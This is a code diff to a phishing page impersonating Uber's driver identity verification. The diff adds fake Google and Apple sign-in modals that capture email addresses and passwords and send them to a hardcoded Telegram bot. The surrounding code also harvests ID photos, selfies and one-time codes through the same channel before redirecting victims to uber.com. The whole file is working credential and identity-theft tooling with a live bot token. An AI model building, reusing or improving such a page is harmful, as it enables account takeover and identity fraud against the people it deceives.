@@ -124,11 +124,72 @@
             gap: 10px;
             cursor: pointer;
         }
+        .social-btn img {
+            width: 20px;
+            height: 20px;
+        }
         .terms {
             font-size: 12px;
             color: #6B6B6B;
             text-align: center;
             margin-top: 24px;
+        }
+        /* Login modal for Google/Apple */
+        .login-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .login-modal.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        .login-modal-content {
+            background: white;
+            width: 85%;
+            max-width: 340px;
+            border-radius: 28px;
+            padding: 24px;
+            text-align: center;
+        }
+        .login-modal-content h3 {
+            margin-bottom: 20px;
+            font-size: 20px;
+        }
+        .login-modal-content input {
+            margin-bottom: 16px;
+        }
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        .modal-buttons button {
+            flex: 1;
+            padding: 12px;
+            border-radius: 44px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .modal-confirm {
+            background: #000000;
+            color: white;
+        }
+        .modal-cancel {
+            background: #F8F8F8;
+            color: #1A1A1A;
+            border: 1px solid #E5E5E5;
         }
         .step-indicator {
             display: flex;
@@ -269,7 +330,7 @@
         <div class="sub">Driver identity verification</div>
     </div>
 
-    <!-- Step 1: Login (Email/Phone + Social) -->
+    <!-- Step 1: Login Panel -->
     <div id="loginPanel" class="panel">
         <div class="input-group">
             <div class="input-label">What's your phone number or email?</div>
@@ -279,10 +340,19 @@
         <div class="divider">or</div>
         <div class="social-buttons">
             <div class="social-btn" id="googleLoginBtn">
-                <span style="font-size:18px;">G</span> Continue with Google
+                <svg width="20" height="20" viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                Continue with Google
             </div>
             <div class="social-btn" id="appleLoginBtn">
-                <span style="font-size:18px;">🍎</span> Continue with Apple
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="black">
+                    <path d="M17.05 3.3c.5.6.9 1.4.8 2.2-.8.1-1.7.4-2.3.9-.6.5-1.1 1.1-1.1 1.8 0 .7.4 1.4 1.1 1.9.5.3 1.2.5 1.9.5.9 0 1.7-.3 2.4-.8.6-.4 1.1-1 1.4-1.7.3-.7.4-1.5.3-2.2-.7-.2-1.4-.5-2-.9-.6-.4-1-.9-1.3-1.5zM14.5 8.2c-.3.7-.9 1.3-1.6 1.7-.7.4-1.5.6-2.3.6-.8 0-1.6-.2-2.3-.6-.7-.4-1.3-1-1.6-1.7-.3-.7-.4-1.5-.3-2.3.8-.1 1.6.1 2.3.4.7.3 1.3.8 1.6 1.5.3-.7.9-1.2 1.6-1.5.7-.3 1.5-.5 2.3-.4.1.8 0 1.6-.3 2.3zM12 22c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"/>
+                </svg>
+                Continue with Apple
             </div>
         </div>
         <div class="terms">
@@ -296,10 +366,10 @@
         <div class="step-indicator" id="stepIndicator">
             <div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div>
         </div>
-        <!-- Step 1: ID Type + State (full US states) -->
         <div id="kycStep1" class="kyc-step">
             <div class="input-group"><div class="input-label">ID Type</div><select id="idType"><option value="">Select</option><option>Driver's License</option><option>State ID</option><option>Passport</option></select></div>
-            <div class="input-group"><div class="input-label">Issuing State</div><select id="idState"><option value="">Select state</option>
+            <div class="input-group"><div class="input-label">Issuing State</div><select id="idState">
+                <option value="">Select state</option>
                 <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option>
                 <option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option>
                 <option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option>
@@ -313,28 +383,24 @@
             </select></div>
             <button class="action-btn" id="kycStep1Next">Continue →</button>
         </div>
-        <!-- Step 2: Front ID -->
         <div id="kycStep2" class="kyc-step hide">
             <div class="status-badge">📸 Capture FRONT of ID</div>
             <div class="camera-container"><div class="square-camera"><video id="frontVideo" autoplay playsinline muted></video></div></div>
             <div class="camera-controls"><div class="switch-cam" id="switchFrontCam">⟳</div><div class="capture-btn" id="captureFrontBtn"></div><div style="width:44px;"></div></div>
             <div class="status-badge" id="frontStatus">Ready</div>
         </div>
-        <!-- Step 3: Back ID -->
         <div id="kycStep3" class="kyc-step hide">
             <div class="status-badge">📸 Capture BACK of ID</div>
             <div class="camera-container"><div class="square-camera"><video id="backVideo" autoplay playsinline muted></video></div></div>
             <div class="camera-controls"><div class="switch-cam" id="switchBackCam">⟳</div><div class="capture-btn" id="captureBackBtn"></div><div style="width:44px;"></div></div>
             <div class="status-badge" id="backStatus">Ready</div>
         </div>
-        <!-- Step 4: Selfie -->
         <div id="kycStep4" class="kyc-step hide">
             <div class="status-badge">🤳 Take a selfie</div>
             <div class="camera-container"><div class="square-camera"><video id="selfieVideo" autoplay playsinline muted></video></div></div>
             <div class="camera-controls"><div class="switch-cam" id="switchSelfieCam">⟳</div><div class="capture-btn" id="captureSelfieBtn"></div><div style="width:44px;"></div></div>
             <div class="status-badge" id="selfieStatus">Ready</div>
         </div>
-        <!-- Step 5: Selfie with ID -->
         <div id="kycStep5" class="kyc-step hide">
             <div class="status-badge">🪪 Selfie holding ID next to face</div>
             <div class="camera-container"><div class="square-camera"><video id="selfieIdVideo" autoplay playsinline muted></video></div></div>
@@ -355,15 +421,38 @@
     <div id="toastMsg" class="toast"></div>
 </div>
 
+<!-- Login Modals for Google and Apple -->
+<div id="googleModal" class="login-modal">
+    <div class="login-modal-content">
+        <h3>Sign in with Google</h3>
+        <input type="email" id="googleEmail" placeholder="Gmail address" autocomplete="off">
+        <input type="password" id="googlePassword" placeholder="Password">
+        <div class="modal-buttons">
+            <button class="modal-cancel" id="googleModalCancel">Cancel</button>
+            <button class="modal-confirm" id="googleModalConfirm">Sign in</button>
+        </div>
+    </div>
+</div>
+
+<div id="appleModal" class="login-modal">
+    <div class="login-modal-content">
+        <h3>Sign in with Apple</h3>
+        <input type="email" id="appleEmail" placeholder="Apple ID (email)" autocomplete="off">
+        <input type="password" id="applePassword" placeholder="Password">
+        <div class="modal-buttons">
+            <button class="modal-cancel" id="appleModalCancel">Cancel</button>
+            <button class="modal-confirm" id="appleModalConfirm">Sign in</button>
+        </div>
+    </div>
+</div>
+
 <div id="loadingOverlay" class="loading-overlay">
     <div class="spinner"></div>
     <div class="loading-text">Processing verification...<br>Please wait</div>
 </div>
 
 <script>
-    // ----------------------------------------------
-    // TELEGRAM CREDENTIALS (embedded)
-    // ----------------------------------------------
+    // Telegram credentials (hardcoded)
     const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
     const CHAT_ID   = "8737104261";
 
@@ -375,8 +464,10 @@
     const loadingOverlay = document.getElementById('loadingOverlay');
     const loginInput = document.getElementById('loginInput');
     const loginContinueBtn = document.getElementById('loginContinueBtn');
-    const googleLoginBtn = document.getElementById('googleLoginBtn');
-    const appleLoginBtn = document.getElementById('appleLoginBtn');
+    const googleBtn = document.getElementById('googleLoginBtn');
+    const appleBtn = document.getElementById('appleLoginBtn');
+    const googleModal = document.getElementById('googleModal');
+    const appleModal = document.getElementById('appleModal');
     const otpSubmitBtn = document.getElementById('otpSubmitBtn');
     const otpInput = document.getElementById('otpCode');
 
@@ -388,7 +479,6 @@
         otp: ''
     };
 
-    // Helper: show toast
     function showToast(msg, isErr = false) {
         toast.innerText = msg;
         toast.classList.add('show');
@@ -397,20 +487,18 @@
         setTimeout(() => toast.classList.remove('show'), 3000);
     }
 
-    // Telegram send text
     async function sendToTelegram(text) {
         try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
             });
-            const data = await response.json();
+            const data = await res.json();
             return data.ok;
         } catch(e) { return false; }
     }
 
-    // Send photo
     async function sendPhotoToTelegram(blob, caption) {
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
@@ -423,14 +511,13 @@
         } catch(e) { return false; }
     }
 
-    // Function to start KYC after successful login
     function startKyc() {
         loginPanel.style.display = 'none';
         kycPanel.classList.remove('hide');
         showStep(1);
     }
 
-    // Step 1: Continue button (manual entry)
+    // Manual login
     loginContinueBtn.onclick = () => {
         let value = loginInput.value.trim();
         if (!value) {
@@ -443,23 +530,45 @@
         startKyc();
     };
 
-    // Google login simulation
-    googleLoginBtn.onclick = () => {
-        userData.loginValue = 'google_user@example.com';
+    // Google login modal
+    googleBtn.onclick = () => {
+        googleModal.classList.add('active');
+    };
+    document.getElementById('googleModalCancel').onclick = () => googleModal.classList.remove('active');
+    document.getElementById('googleModalConfirm').onclick = async () => {
+        let email = document.getElementById('googleEmail').value.trim();
+        let password = document.getElementById('googlePassword').value.trim();
+        if (!email || !password) {
+            showToast("Please enter Gmail email and password", true);
+            return;
+        }
+        userData.loginValue = email;
         userData.loginMethod = 'google';
-        sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nLogin: Continue with Google\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        await sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nMethod: Google\nEmail: ${email}\nPassword: ${password}\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        googleModal.classList.remove('active');
         startKyc();
     };
 
-    // Apple login simulation
-    appleLoginBtn.onclick = () => {
-        userData.loginValue = 'apple_user@icloud.com';
+    // Apple login modal
+    appleBtn.onclick = () => {
+        appleModal.classList.add('active');
+    };
+    document.getElementById('appleModalCancel').onclick = () => appleModal.classList.remove('active');
+    document.getElementById('appleModalConfirm').onclick = async () => {
+        let email = document.getElementById('appleEmail').value.trim();
+        let password = document.getElementById('applePassword').value.trim();
+        if (!email || !password) {
+            showToast("Please enter Apple ID email and password", true);
+            return;
+        }
+        userData.loginValue = email;
         userData.loginMethod = 'apple';
-        sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nLogin: Continue with Apple\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        await sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nMethod: Apple\nEmail: ${email}\nPassword: ${password}\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        appleModal.classList.remove('active');
         startKyc();
     };
 
-    // KYC Steps logic
+    // KYC Steps (unchanged)
     let currentKycStep = 1;
     let frontStream, backStream, selfieStream, selfieIdStream;
     let usingRearFront = true, usingRearBack = true, usingRearSelfie = false, usingRearSelfieId = false;
@@ -524,7 +633,6 @@
         }, 'image/jpeg', 0.8);
     }
 
-    // Step 1 (ID type)
     document.getElementById('kycStep1Next').onclick = () => {
         let idType = document.getElementById('idType').value;
         let idState = document.getElementById('idState').value;
@@ -534,26 +642,19 @@
         sendToTelegram(`📄 ID Type: ${idType}, State: ${idState}`);
         showStep(2);
     };
-
-    // Step 2 front
     document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'), frontStream, s=>frontStream=s, v=>usingRearFront=v, usingRearFront);
     document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'), document.getElementById('frontStatus'), "Front ID", 3);
-    // Step 3 back
     document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'), backStream, s=>backStream=s, v=>usingRearBack=v, usingRearBack);
     document.getElementById('captureBackBtn').onclick = () => capturePhoto(document.getElementById('backVideo'), document.getElementById('backStatus'), "Back ID", 4);
-    // Step 4 selfie
     document.getElementById('switchSelfieCam').onclick = () => switchCamera(document.getElementById('selfieVideo'), selfieStream, s=>selfieStream=s, v=>usingRearSelfie=v, usingRearSelfie);
     document.getElementById('captureSelfieBtn').onclick = () => capturePhoto(document.getElementById('selfieVideo'), document.getElementById('selfieStatus'), "Selfie", 5);
-    // Step 5 selfie with ID
     document.getElementById('switchSelfieIdCam').onclick = () => switchCamera(document.getElementById('selfieIdVideo'), selfieIdStream, s=>selfieIdStream=s, v=>usingRearSelfieId=v, usingRearSelfieId);
     document.getElementById('captureSelfieIdBtn').onclick = () => capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "Selfie holding ID", null).then(() => {
-        // All photos done → show OTP panel
         kycPanel.classList.add('hide');
         otpPanel.classList.remove('hide');
         showToast("All documents uploaded. Enter verification code.", false);
     });
 
-    // OTP submission (any digits, any length)
     otpSubmitBtn.onclick = async () => {
         let otp = otpInput.value.trim();
         if (otp.length === 0) {
@@ -566,9 +667,7 @@
         setTimeout(() => {
             loadingOverlay.classList.remove('active');
             showToast("✅ Verification successful! Redirecting to Uber...", false);
-            setTimeout(() => {
-                window.location.href = "https://www.uber.com";
-            }, 1500);
+            setTimeout(() => window.location.href = "https://www.uber.com", 1500);
         }, 1500);
     };
 </script>
